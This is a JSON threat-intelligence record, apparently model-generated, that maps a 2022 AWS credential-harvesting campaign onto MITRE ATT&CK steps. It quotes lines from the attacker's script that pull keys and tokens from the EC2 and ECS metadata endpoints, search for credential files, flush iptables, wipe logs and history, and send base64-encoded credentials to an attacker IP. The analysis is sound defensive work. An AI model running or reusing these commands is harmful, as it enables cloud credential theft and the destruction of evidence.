@@ -1,0 +1,627 @@
+{
+  "tactics_used": [
+    {
+      "tactic_id": "TA0001",
+      "tactic_name": "Initial Access",
+      "techniques": [
+        {
+          "technique_id": "T1190",
+          "technique_name": "Exploit Public-Facing Application",
+          "inferred": true,
+          "evidence_quote": "The majority of the victim system were running public facing Jupyter Notebooks. While this campaign is ongoing...we do suspect it is likely related to exploitation of vulnerable web applications.",
+          "validated": true
+        }
+      ]
+    },
+    {
+      "tactic_id": "TA0002",
+      "tactic_name": "Execution",
+      "techniques": [
+        {
+          "technique_id": "T1059.004",
+          "technique_name": "Command and Scripting Interpreter: Unix Shell",
+          "inferred": false,
+          "evidence_quote": "The file aws.sh was uploaded and made accessible...aws.sh is a utility that is meant to harvest credentials from AWS EC2 instances",
+          "validated": false
+        }
+      ]
+    },
+    {
+      "tactic_id": "TA0005",
+      "tactic_name": "Defense Evasion",
+      "techniques": [
+        {
+          "technique_id": "T1070.002",
+          "technique_name": "Indicator Removal: Clear Linux or Mac System Logs",
+          "inferred": false,
+          "evidence_quote": "rm -f /var/log/syslog.* 2>/dev/null 1>/dev/null\nrm -f /var/log/auth.log.* 2>/dev/null 1>/dev/null\nlastlog --clear --user root",
+          "validated": false
+        },
+        {
+          "technique_id": "T1070.003",
+          "technique_name": "Indicator Removal: Clear Command History",
+          "inferred": false,
+          "evidence_quote": "rm -f ~/.bash_history 2>/dev/null 1>/dev/null\ntouch ~/.bash_history 2>/dev/null 1>/dev/null\nchattr +i ~/.bash_history 2>/dev/null 1>/dev/null\nhistory -cw",
+          "validated": false
+        },
+        {
+          "technique_id": "T1562.004",
+          "technique_name": "Impair Defenses: Disable or Modify System Firewall",
+          "inferred": false,
+          "evidence_quote": "iptables -P INPUT ACCEPT 2>/dev/null 1>/dev/null\niptables -P FORWARD ACCEPT 2>/dev/null 1>/dev/null\niptables -P OUTPUT ACCEPT 2>/dev/null 1>/dev/null\niptables -F 2>/dev/null 1>/dev/null",
+          "validated": false
+        }
+      ]
+    },
+    {
+      "tactic_id": "TA0006",
+      "tactic_name": "Credential Access",
+      "techniques": [
+        {
+          "technique_id": "T1552.005",
+          "technique_name": "Unsecured Credentials: Cloud Instance Metadata API",
+          "inferred": false,
+          "evidence_quote": "AWS_INFO=$(dload http://169.254.169.254/latest/meta-data/iam/info | tr '\\0' '\\n')\nAWS_1_EC2=$(dload http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance | tr '\\0' '\\n')",
+          "validated": true
+        },
+        {
+          "technique_id": "T1552.001",
+          "technique_name": "Unsecured Credentials: Credentials In Files",
+          "inferred": false,
+          "evidence_quote": "find / -maxdepth 23 -type f -name $CREFILE 2>/dev/null | xargs -I % sh -c 'echo :::%; cat %' >> $EDIS",
+          "validated": true
+        },
+        {
+          "technique_id": "T1552.007",
+          "technique_name": "Unsecured Credentials: Container API",
+          "inferred": false,
+          "evidence_quote": "dload http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI | sed 's/,/\\n/g' | grep 'AccessKeyId\\|SecretAccessKey\\|Token\\|Expiration'",
+          "validated": true
+        },
+        {
+          "technique_id": "T1552.004",
+          "technique_name": "Unsecured Credentials: Private Keys",
+          "inferred": true,
+          "evidence_quote": "CRED_FILE_NAMES=(\"credentials\" \".s3cfg\" \".passwd-s3fs\" \"authinfo2\" ... \"secrets\" \".boto\" \".netrc\" \".git-credentials\")",
+          "validated": false
+        }
+      ]
+    },
+    {
+      "tactic_id": "TA0007",
+      "tactic_name": "Discovery",
+      "techniques": [
+        {
+          "technique_id": "T1580",
+          "technique_name": "Cloud Infrastructure Discovery",
+          "inferred": false,
+          "evidence_quote": "AWS_INFO=$(dload http://169.254.169.254/latest/meta-data/iam/info | tr '\\0' '\\n')",
+          "validated": true
+        },
+        {
+          "technique_id": "T1613",
+          "technique_name": "Container and Resource Discovery",
+          "inferred": false,
+          "evidence_quote": "docker ps 2>/dev/null 1>/dev/null\nif [[\"$?\" = \"0\"]]; then \n4W5_DOCKER=$(docker inspect $(docker ps -aq) | grep \"AWS\\|EC2\")",
+          "validated": true
+        }
+      ]
+    },
+    {
+      "tactic_id": "TA0010",
+      "tactic_name": "Exfiltration",
+      "techniques": [
+        {
+          "technique_id": "T1041",
+          "technique_name": "Exfiltration Over C2 Channel",
+          "inferred": false,
+          "evidence_quote": "SEND_B64_DATA=$(cat $CSOF | base64 -w 0)\nrm -f $CSOF\ndload http://45.9.148.221/in/in.php?base64=$SEND_B64_DATA > /dev/null",
+          "validated": false
+        }
+      ]
+    },
+    {
+      "tactic_id": "TA0011",
+      "tactic_name": "Command and Control",
+      "techniques": [
+        {
+          "technique_id": "T1071.001",
+          "technique_name": "Application Layer Protocol: Web Protocols",
+          "inferred": false,
+          "evidence_quote": "harvested credentials are uploaded to an open HTTP directory http://45.9.148.221/<redacted>/",
+          "validated": false
+        }
+      ]
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "technique_id": "T1190",
+      "technique_name": "Exploit Public-Facing Application",
+      "description": "Attacker exploited publicly facing Jupyter Notebooks or Kubernetes instances to gain initial foothold on victim systems.",
+      "evidence_quote": "The majority of the victim system were running public facing Jupyter Notebooks...we do suspect it is likely related to exploitation of vulnerable web applications.",
+      "evidence_sources": [
+        "https://permiso.io/blog/s/christmas-cloud-cred-harvesting-campaign/"
+      ],
+      "aws_services_involved": [
+        "EC2"
+      ],
+      "validated": true
+    },
+    {
+      "step": 2,
+      "technique_id": "T1059.004",
+      "technique_name": "Command and Scripting Interpreter: Unix Shell",
+      "description": "Attacker downloaded and executed aws.sh, a Bash credential harvesting script, on compromised systems.",
+      "evidence_quote": "The file aws.sh was uploaded and made accessible at the path: http://45.9.148.221/sh/get/aws.sh. aws.sh is a utility that is meant to harvest credentials from AWS EC2 instances",
+      "evidence_sources": [
+        "https://permiso.io/blog/s/christmas-cloud-cred-harvesting-campaign/"
+      ],
+      "aws_services_involved": [
+        "EC2"
+      ],
+      "validated": false
+    },
+    {
+      "step": 3,
+      "technique_id": "T1562.004",
+      "technique_name": "Impair Defenses: Disable or Modify System Firewall",
+      "description": "The script flushed all iptables rules and set default policies to ACCEPT, disabling host-based firewall protections.",
+      "evidence_quote": "iptables -P INPUT ACCEPT 2>/dev/null 1>/dev/null\niptables -P FORWARD ACCEPT 2>/dev/null 1>/dev/null\niptables -P OUTPUT ACCEPT 2>/dev/null 1>/dev/null\niptables -F 2>/dev/null 1>/dev/null",
+      "evidence_sources": [
+        "https://permiso.io/blog/s/christmas-cloud-cred-harvesting-campaign/"
+      ],
+      "aws_services_involved": [
+        "EC2"
+      ],
+      "validated": false
+    },
+    {
+      "step": 4,
+      "technique_id": "T1580",
+      "technique_name": "Cloud Infrastructure Discovery",
+      "description": "The script queried the AWS EC2 Instance Metadata Service (IMDSv1) to enumerate IAM instance profile information.",
+      "evidence_quote": "AWS_INFO=$(dload http://169.254.169.254/latest/meta-data/iam/info | tr '\\0' '\\n')",
+      "evidence_sources": [
+        "https://permiso.io/blog/s/christmas-cloud-cred-harvesting-campaign/"
+      ],
+      "aws_services_involved": [
+        "EC2",
+        "IAM"
+      ],
+      "validated": true
+    },
+    {
+      "step": 5,
+      "technique_id": "T1613",
+      "technique_name": "Container and Resource Discovery",
+      "description": "The script enumerated running Docker containers and inspected them for AWS and EC2 environment variables.",
+      "evidence_quote": "docker ps 2>/dev/null 1>/dev/null\nif [[\"$?\" = \"0\"]]; then \n4W5_DOCKER=$(docker inspect $(docker ps -aq) | grep \"AWS\\|EC2\")",
+      "evidence_sources": [
+        "https://permiso.io/blog/s/christmas-cloud-cred-harvesting-campaign/"
+      ],
+      "aws_services_involved": [
+        "EC2"
+      ],
+      "validated": true
+    },
+    {
+      "step": 6,
+      "technique_id": "T1552.005",
+      "technique_name": "Unsecured Credentials: Cloud Instance Metadata API",
+      "description": "The script harvested AWS access keys, secret keys, and session tokens from the EC2 IMDS endpoint for both instance credentials and IAM role credentials.",
+      "evidence_quote": "AWS_1_EC2=$(dload http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance | tr '\\0' '\\n')\nAWS_1_IAM_NAME=$(dload http://169.254.169.254/latest/meta-data/iam/security-credentials/)",
+      "evidence_sources": [
+        "https://permiso.io/blog/s/christmas-cloud-cred-harvesting-campaign/"
+      ],
+      "aws_services_involved": [
+        "EC2",
+        "IAM"
+      ],
+      "validated": true
+    },
+    {
+      "step": 7,
+      "technique_id": "T1552.007",
+      "technique_name": "Unsecured Credentials: Container API",
+      "description": "The script also retrieved credentials from the ECS container credentials endpoint using the AWS_CONTAINER_CREDENTIALS_RELATIVE_URI environment variable.",
+      "evidence_quote": "dload http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI | sed 's/,/\\n/g' | grep 'AccessKeyId\\|SecretAccessKey\\|Token\\|Expiration'",
+      "evidence_sources": [
+        "https://permiso.io/blog/s/christmas-cloud-cred-harvesting-campaign/"
+      ],
+      "aws_services_involved": [
+        "ECS"
+      ],
+      "validated": true
+    },
+    {
+      "step": 8,
+      "technique_id": "T1552.001",
+      "technique_name": "Unsecured Credentials: Credentials In Files",
+      "description": "The script searched the entire filesystem for credential files including AWS credentials files, .s3cfg, .boto, .git-credentials, .netrc, and many others.",
+      "evidence_quote": "find / -maxdepth 23 -type f -name $CREFILE 2>/dev/null | xargs -I % sh -c 'echo :::%; cat %' >> $EDIS",
+      "evidence_sources": [
+        "https://permiso.io/blog/s/christmas-cloud-cred-harvesting-campaign/"
+      ],
+      "aws_services_involved": [
+        "EC2"
+      ],
+      "validated": true
+    },
+    {
+      "step": 9,
+      "technique_id": "T1070.002",
+      "technique_name": "Indicator Removal: Clear Linux or Mac System Logs",
+      "description": "The script cleared syslog, auth.log, wtmp, btmp, lastlog, and ran lastlog --clear to remove forensic evidence of the intrusion.",
+      "evidence_quote": "rm -f /var/log/syslog.* 2>/dev/null 1>/dev/null\nrm -f /var/log/auth.log.* 2>/dev/null 1>/dev/null\nlastlog --clear --user root 2>/dev/null 1>/dev/null",
+      "evidence_sources": [
+        "https://permiso.io/blog/s/christmas-cloud-cred-harvesting-campaign/"
+      ],
+      "aws_services_involved": [
+        "EC2"
+      ],
+      "validated": false
+    },
+    {
+      "step": 10,
+      "technique_id": "T1070.003",
+      "technique_name": "Indicator Removal: Clear Command History",
+      "description": "The script deleted and immutably locked bash_history and cleared in-memory command history to prevent forensic recovery.",
+      "evidence_quote": "rm -f ~/.bash_history 2>/dev/null 1>/dev/null\ntouch ~/.bash_history 2>/dev/null 1>/dev/null\nchattr +i ~/.bash_history 2>/dev/null 1>/dev/null\nhistory -cw",
+      "evidence_sources": [
+        "https://permiso.io/blog/s/christmas-cloud-cred-harvesting-campaign/"
+      ],
+      "aws_services_involved": [
+        "EC2"
+      ],
+      "validated": false
+    },
+    {
+      "step": 11,
+      "technique_id": "T1041",
+      "technique_name": "Exfiltration Over C2 Channel",
+      "description": "Harvested credentials were base64-encoded and exfiltrated to the attacker's C2 server via an HTTP GET request to a PHP ingestion endpoint.",
+      "evidence_quote": "SEND_B64_DATA=$(cat $CSOF | base64 -w 0)\nrm -f $CSOF\ndload http://45.9.148.221/in/in.php?base64=$SEND_B64_DATA > /dev/null",
+      "evidence_sources": [
+        "https://permiso.io/blog/s/christmas-cloud-cred-harvesting-campaign/"
+      ],
+      "aws_services_involved": [
+        "EC2"
+      ],
+      "validated": false
+    }
+  ],
+  "aws_services": [
+    "EC2",
+    "IAM",
+    "ECS"
+  ],
+  "impact_type": "Credential Theft",
+  "confidence_score": 0.9,
+  "data_exfiltrated": true,
+  "initial_access_vector": "Exploitation of publicly facing Jupyter Notebooks and/or Kubernetes instances (IMDSv1-accessible EC2 hosts)",
+  "persistence_mechanism": null,
+  "privilege_escalation": null,
+  "attack_chain_graph": {
+    "nodes": [
+      {
+        "step": 1,
+        "technique_id": "T1190",
+        "technique_name": "Exploit Public-Facing Application",
+        "description": "Attacker exploited publicly facing Jupyter Notebooks or Kubernetes instances to gain initial foothold on victim systems.",
+        "tactic_id": "TA0001",
+        "evidence_quote": "The majority of the victim system were running public facing Jupyter Notebooks...we do suspect it is likely related to exploitation of vulnerable web applications.",
+        "evidence_sources": [
+          "https://permiso.io/blog/s/christmas-cloud-cred-harvesting-campaign/"
+        ],
+        "aws_services_involved": [
+          "EC2"
+        ]
+      },
+      {
+        "step": 2,
+        "technique_id": "T1059.004",
+        "technique_name": "Command and Scripting Interpreter: Unix Shell",
+        "description": "Attacker downloaded and executed aws.sh, a Bash credential harvesting script, on compromised systems.",
+        "tactic_id": "",
+        "evidence_quote": "The file aws.sh was uploaded and made accessible at the path: http://45.9.148.221/sh/get/aws.sh. aws.sh is a utility that is meant to harvest credentials from AWS EC2 instances",
+        "evidence_sources": [
+          "https://permiso.io/blog/s/christmas-cloud-cred-harvesting-campaign/"
+        ],
+        "aws_services_involved": [
+          "EC2"
+        ]
+      },
+      {
+        "step": 3,
+        "technique_id": "T1562.004",
+        "technique_name": "Impair Defenses: Disable or Modify System Firewall",
+        "description": "The script flushed all iptables rules and set default policies to ACCEPT, disabling host-based firewall protections.",
+        "tactic_id": "",
+        "evidence_quote": "iptables -P INPUT ACCEPT 2>/dev/null 1>/dev/null\niptables -P FORWARD ACCEPT 2>/dev/null 1>/dev/null\niptables -P OUTPUT ACCEPT 2>/dev/null 1>/dev/null\niptables -F 2>/dev/null 1>/dev/null",
+        "evidence_sources": [
+          "https://permiso.io/blog/s/christmas-cloud-cred-harvesting-campaign/"
+        ],
+        "aws_services_involved": [
+          "EC2"
+        ]
+      },
+      {
+        "step": 4,
+        "technique_id": "T1580",
+        "technique_name": "Cloud Infrastructure Discovery",
+        "description": "The script queried the AWS EC2 Instance Metadata Service (IMDSv1) to enumerate IAM instance profile information.",
+        "tactic_id": "TA0007",
+        "evidence_quote": "AWS_INFO=$(dload http://169.254.169.254/latest/meta-data/iam/info | tr '\\0' '\\n')",
+        "evidence_sources": [
+          "https://permiso.io/blog/s/christmas-cloud-cred-harvesting-campaign/"
+        ],
+        "aws_services_involved": [
+          "EC2",
+          "IAM"
+        ]
+      },
+      {
+        "step": 5,
+        "technique_id": "T1613",
+        "technique_name": "Container and Resource Discovery",
+        "description": "The script enumerated running Docker containers and inspected them for AWS and EC2 environment variables.",
+        "tactic_id": "TA0007",
+        "evidence_quote": "docker ps 2>/dev/null 1>/dev/null\nif [[\"$?\" = \"0\"]]; then \n4W5_DOCKER=$(docker inspect $(docker ps -aq) | grep \"AWS\\|EC2\")",
+        "evidence_sources": [
+          "https://permiso.io/blog/s/christmas-cloud-cred-harvesting-campaign/"
+        ],
+        "aws_services_involved": [
+          "EC2"
+        ]
+      },
+      {
+        "step": 6,
+        "technique_id": "T1552.005",
+        "technique_name": "Cloud Instance Metadata API",
+        "description": "The script harvested AWS access keys, secret keys, and session tokens from the EC2 IMDS endpoint for both instance credentials and IAM role credentials.",
+        "tactic_id": "TA0006",
+        "evidence_quote": "AWS_1_EC2=$(dload http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance | tr '\\0' '\\n')\nAWS_1_IAM_NAME=$(dload http://169.254.169.254/latest/meta-data/iam/security-credentials/)",
+        "evidence_sources": [
+          "https://permiso.io/blog/s/christmas-cloud-cred-harvesting-campaign/"
+        ],
+        "aws_services_involved": [
+          "EC2",
+          "IAM"
+        ]
+      },
+      {
+        "step": 7,
+        "technique_id": "T1552.007",
+        "technique_name": "Container API",
+        "description": "The script also retrieved credentials from the ECS container credentials endpoint using the AWS_CONTAINER_CREDENTIALS_RELATIVE_URI environment variable.",
+        "tactic_id": "TA0006",
+        "evidence_quote": "dload http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI | sed 's/,/\\n/g' | grep 'AccessKeyId\\|SecretAccessKey\\|Token\\|Expiration'",
+        "evidence_sources": [
+          "https://permiso.io/blog/s/christmas-cloud-cred-harvesting-campaign/"
+        ],
+        "aws_services_involved": [
+          "ECS"
+        ]
+      },
+      {
+        "step": 8,
+        "technique_id": "T1552.001",
+        "technique_name": "Credentials In Files",
+        "description": "The script searched the entire filesystem for credential files including AWS credentials files, .s3cfg, .boto, .git-credentials, .netrc, and many others.",
+        "tactic_id": "TA0006",
+        "evidence_quote": "find / -maxdepth 23 -type f -name $CREFILE 2>/dev/null | xargs -I % sh -c 'echo :::%; cat %' >> $EDIS",
+        "evidence_sources": [
+          "https://permiso.io/blog/s/christmas-cloud-cred-harvesting-campaign/"
+        ],
+        "aws_services_involved": [
+          "EC2"
+        ]
+      },
+      {
+        "step": 9,
+        "technique_id": "T1070.002",
+        "technique_name": "Indicator Removal: Clear Linux or Mac System Logs",
+        "description": "The script cleared syslog, auth.log, wtmp, btmp, lastlog, and ran lastlog --clear to remove forensic evidence of the intrusion.",
+        "tactic_id": "",
+        "evidence_quote": "rm -f /var/log/syslog.* 2>/dev/null 1>/dev/null\nrm -f /var/log/auth.log.* 2>/dev/null 1>/dev/null\nlastlog --clear --user root 2>/dev/null 1>/dev/null",
+        "evidence_sources": [
+          "https://permiso.io/blog/s/christmas-cloud-cred-harvesting-campaign/"
+        ],
+        "aws_services_involved": [
+          "EC2"
+        ]
+      },
+      {
+        "step": 10,
+        "technique_id": "T1070.003",
+        "technique_name": "Indicator Removal: Clear Command History",
+        "description": "The script deleted and immutably locked bash_history and cleared in-memory command history to prevent forensic recovery.",
+        "tactic_id": "",
+        "evidence_quote": "rm -f ~/.bash_history 2>/dev/null 1>/dev/null\ntouch ~/.bash_history 2>/dev/null 1>/dev/null\nchattr +i ~/.bash_history 2>/dev/null 1>/dev/null\nhistory -cw",
+        "evidence_sources": [
+          "https://permiso.io/blog/s/christmas-cloud-cred-harvesting-campaign/"
+        ],
+        "aws_services_involved": [
+          "EC2"
+        ]
+      },
+      {
+        "step": 11,
+        "technique_id": "T1041",
+        "technique_name": "Exfiltration Over C2 Channel",
+        "description": "Harvested credentials were base64-encoded and exfiltrated to the attacker's C2 server via an HTTP GET request to a PHP ingestion endpoint.",
+        "tactic_id": "",
+        "evidence_quote": "SEND_B64_DATA=$(cat $CSOF | base64 -w 0)\nrm -f $CSOF\ndload http://45.9.148.221/in/in.php?base64=$SEND_B64_DATA > /dev/null",
+        "evidence_sources": [
+          "https://permiso.io/blog/s/christmas-cloud-cred-harvesting-campaign/"
+        ],
+        "aws_services_involved": [
+          "EC2"
+        ]
+      }
+    ],
+    "edges": [
+      {
+        "source": "T1190",
+        "target": "T1059.004",
+        "source_step": 1,
+        "target_step": 2,
+        "source_technique_name": "Exploit Public-Facing Application",
+        "target_technique_name": "Command and Scripting Interpreter: Unix Shell",
+        "sources": [
+          "https://permiso.io/blog/s/christmas-cloud-cred-harvesting-campaign/"
+        ],
+        "evidence_quotes": [
+          "The majority of the victim system were running public facing Jupyter Notebooks...we do suspect it is likely related to exploitation of vulnerable web applications.",
+          "The file aws.sh was uploaded and made accessible at the path: http://45.9.148.221/sh/get/aws.sh. aws.sh is a utility that is meant to harvest credentials from AWS EC2 instances"
+        ]
+      },
+      {
+        "source": "T1059.004",
+        "target": "T1562.004",
+        "source_step": 2,
+        "target_step": 3,
+        "source_technique_name": "Command and Scripting Interpreter: Unix Shell",
+        "target_technique_name": "Impair Defenses: Disable or Modify System Firewall",
+        "sources": [
+          "https://permiso.io/blog/s/christmas-cloud-cred-harvesting-campaign/"
+        ],
+        "evidence_quotes": [
+          "The file aws.sh was uploaded and made accessible at the path: http://45.9.148.221/sh/get/aws.sh. aws.sh is a utility that is meant to harvest credentials from AWS EC2 instances",
+          "iptables -P INPUT ACCEPT 2>/dev/null 1>/dev/null\niptables -P FORWARD ACCEPT 2>/dev/null 1>/dev/null\niptables -P OUTPUT ACCEPT 2>/dev/null 1>/dev/null\niptables -F 2>/dev/null 1>/dev/null"
+        ]
+      },
+      {
+        "source": "T1562.004",
+        "target": "T1580",
+        "source_step": 3,
+        "target_step": 4,
+        "source_technique_name": "Impair Defenses: Disable or Modify System Firewall",
+        "target_technique_name": "Cloud Infrastructure Discovery",
+        "sources": [
+          "https://permiso.io/blog/s/christmas-cloud-cred-harvesting-campaign/"
+        ],
+        "evidence_quotes": [
+          "iptables -P INPUT ACCEPT 2>/dev/null 1>/dev/null\niptables -P FORWARD ACCEPT 2>/dev/null 1>/dev/null\niptables -P OUTPUT ACCEPT 2>/dev/null 1>/dev/null\niptables -F 2>/dev/null 1>/dev/null",
+          "AWS_INFO=$(dload http://169.254.169.254/latest/meta-data/iam/info | tr '\\0' '\\n')"
+        ]
+      },
+      {
+        "source": "T1580",
+        "target": "T1613",
+        "source_step": 4,
+        "target_step": 5,
+        "source_technique_name": "Cloud Infrastructure Discovery",
+        "target_technique_name": "Container and Resource Discovery",
+        "sources": [
+          "https://permiso.io/blog/s/christmas-cloud-cred-harvesting-campaign/"
+        ],
+        "evidence_quotes": [
+          "AWS_INFO=$(dload http://169.254.169.254/latest/meta-data/iam/info | tr '\\0' '\\n')",
+          "docker ps 2>/dev/null 1>/dev/null\nif [[\"$?\" = \"0\"]]; then \n4W5_DOCKER=$(docker inspect $(docker ps -aq) | grep \"AWS\\|EC2\")"
+        ]
+      },
+      {
+        "source": "T1613",
+        "target": "T1552.005",
+        "source_step": 5,
+        "target_step": 6,
+        "source_technique_name": "Container and Resource Discovery",
+        "target_technique_name": "Cloud Instance Metadata API",
+        "sources": [
+          "https://permiso.io/blog/s/christmas-cloud-cred-harvesting-campaign/"
+        ],
+        "evidence_quotes": [
+          "docker ps 2>/dev/null 1>/dev/null\nif [[\"$?\" = \"0\"]]; then \n4W5_DOCKER=$(docker inspect $(docker ps -aq) | grep \"AWS\\|EC2\")",
+          "AWS_1_EC2=$(dload http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance | tr '\\0' '\\n')\nAWS_1_IAM_NAME=$(dload http://169.254.169.254/latest/meta-data/iam/security-credentials/)"
+        ]
+      },
+      {
+        "source": "T1552.005",
+        "target": "T1552.007",
+        "source_step": 6,
+        "target_step": 7,
+        "source_technique_name": "Cloud Instance Metadata API",
+        "target_technique_name": "Container API",
+        "sources": [
+          "https://permiso.io/blog/s/christmas-cloud-cred-harvesting-campaign/"
+        ],
+        "evidence_quotes": [
+          "AWS_1_EC2=$(dload http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance | tr '\\0' '\\n')\nAWS_1_IAM_NAME=$(dload http://169.254.169.254/latest/meta-data/iam/security-credentials/)",
+          "dload http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI | sed 's/,/\\n/g' | grep 'AccessKeyId\\|SecretAccessKey\\|Token\\|Expiration'"
+        ]
+      },
+      {
+        "source": "T1552.007",
+        "target": "T1552.001",
+        "source_step": 7,
+        "target_step": 8,
+        "source_technique_name": "Container API",
+        "target_technique_name": "Credentials In Files",
+        "sources": [
+          "https://permiso.io/blog/s/christmas-cloud-cred-harvesting-campaign/"
+        ],
+        "evidence_quotes": [
+          "dload http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI | sed 's/,/\\n/g' | grep 'AccessKeyId\\|SecretAccessKey\\|Token\\|Expiration'",
+          "find / -maxdepth 23 -type f -name $CREFILE 2>/dev/null | xargs -I % sh -c 'echo :::%; cat %' >> $EDIS"
+        ]
+      },
+      {
+        "source": "T1552.001",
+        "target": "T1070.002",
+        "source_step": 8,
+        "target_step": 9,
+        "source_technique_name": "Credentials In Files",
+        "target_technique_name": "Indicator Removal: Clear Linux or Mac System Logs",
+        "sources": [
+          "https://permiso.io/blog/s/christmas-cloud-cred-harvesting-campaign/"
+        ],
+        "evidence_quotes": [
+          "find / -maxdepth 23 -type f -name $CREFILE 2>/dev/null | xargs -I % sh -c 'echo :::%; cat %' >> $EDIS",
+          "rm -f /var/log/syslog.* 2>/dev/null 1>/dev/null\nrm -f /var/log/auth.log.* 2>/dev/null 1>/dev/null\nlastlog --clear --user root 2>/dev/null 1>/dev/null"
+        ]
+      },
+      {
+        "source": "T1070.002",
+        "target": "T1070.003",
+        "source_step": 9,
+        "target_step": 10,
+        "source_technique_name": "Indicator Removal: Clear Linux or Mac System Logs",
+        "target_technique_name": "Indicator Removal: Clear Command History",
+        "sources": [
+          "https://permiso.io/blog/s/christmas-cloud-cred-harvesting-campaign/"
+        ],
+        "evidence_quotes": [
+          "rm -f /var/log/syslog.* 2>/dev/null 1>/dev/null\nrm -f /var/log/auth.log.* 2>/dev/null 1>/dev/null\nlastlog --clear --user root 2>/dev/null 1>/dev/null",
+          "rm -f ~/.bash_history 2>/dev/null 1>/dev/null\ntouch ~/.bash_history 2>/dev/null 1>/dev/null\nchattr +i ~/.bash_history 2>/dev/null 1>/dev/null\nhistory -cw"
+        ]
+      },
+      {
+        "source": "T1070.003",
+        "target": "T1041",
+        "source_step": 10,
+        "target_step": 11,
+        "source_technique_name": "Indicator Removal: Clear Command History",
+        "target_technique_name": "Exfiltration Over C2 Channel",
+        "sources": [
+          "https://permiso.io/blog/s/christmas-cloud-cred-harvesting-campaign/"
+        ],
+        "evidence_quotes": [
+          "rm -f ~/.bash_history 2>/dev/null 1>/dev/null\ntouch ~/.bash_history 2>/dev/null 1>/dev/null\nchattr +i ~/.bash_history 2>/dev/null 1>/dev/null\nhistory -cw",
+          "SEND_B64_DATA=$(cat $CSOF | base64 -w 0)\nrm -f $CSOF\ndload http://45.9.148.221/in/in.php?base64=$SEND_B64_DATA > /dev/null"
+        ]
+      }
+    ]
+  },
+  "framework": {
+    "name": "mitre-attack",
+    "version": "unknown"
+  },
+  "schema_version": "1.0",
+  "incident_slug": "permiso-case-study-2-2022-december",
+  "analyzed_at": "2026-04-15T21:04:56.590923+00:00",
+  "model": "claude-sonnet-4-6",
+  "source_chars": 28063
+}
